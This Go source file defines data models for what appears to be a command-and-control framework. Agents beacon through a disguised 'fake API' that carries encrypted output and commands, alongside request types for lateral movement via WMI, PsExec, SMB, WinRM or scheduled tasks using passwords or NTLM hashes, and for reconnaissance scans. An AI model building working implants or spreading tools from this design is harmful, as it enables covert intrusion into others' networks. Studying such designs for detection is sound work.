package models

// AgentInfo 内存中的主机状态信息
type AgentInfo struct {
	ID         string `json:"id"`
	IP         string `json:"ip"`
	Hostname   string `json:"hostname"`
	LastSeen   int64  `json:"last_seen"`
	Status     string `json:"status"`      // active / offline
	LastResult string `json:"last_result"` // 命令回显或截图数据
}

// FakeAPIRequest Agent 发送给 Server 的请求
type FakeAPIRequest struct {
	Hostname string `json:"hostname"`
	Token    string `json:"token"` // 加密的回显数据
	Status   string `json:"status"`
}

// FakeAPIResponse Server 发送给 Agent 的响应
type FakeAPIResponse struct {
	Code int    `json:"code"`
	Data string `json:"data"` // 加密的指令
}

// CommandRequest 管理员下发命令的请求
type CommandRequest struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

// LateralMoveRequest 横向移动请求
type LateralMoveRequest struct {
	ID          string `json:"id"`
	Method      string `json:"method"` // wmi, psexec, smb, winrm, schtasks
	TargetIP    string `json:"target_ip"`
	TargetHost  string `json:"target_host"`
	Port        int    `json:"port"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Domain      string `json:"domain"`
	Hash        string `json:"hash"` // NTLM Hash
	Command     string `json:"command"`
	PayloadPath string `json:"payload_path"`
}

// LateralMoveResponse 横向移动响应
type LateralMoveResponse struct {
	ID      string `json:"id"`
	Success bool   `json:"success"`
	Method  string `json:"method"`
	Target  string `json:"target"`
	Message string `json:"message"`
	Output  string `json:"output"`
}

// ReconRequest 侦察请求
type ReconRequest struct {
	ID       string `json:"id"`
	Type     string `json:"type"` // scan, smbcheck, wmicheck, winrmcheck, sysinfo, processes, users
	TargetIP string `json:"target_ip"`
	Subnet   string `json:"subnet"`
	Username string `json:"username"`
	Password string `json:"password"`
	Domain   string `json:"domain"`
}

// ReconResponse 侦察响应
type ReconResponse struct {
	ID      string `json:"id"`
	Success bool   `json:"success"`
	Type    string `json:"type"`
	Data    string `json:"data"`
}
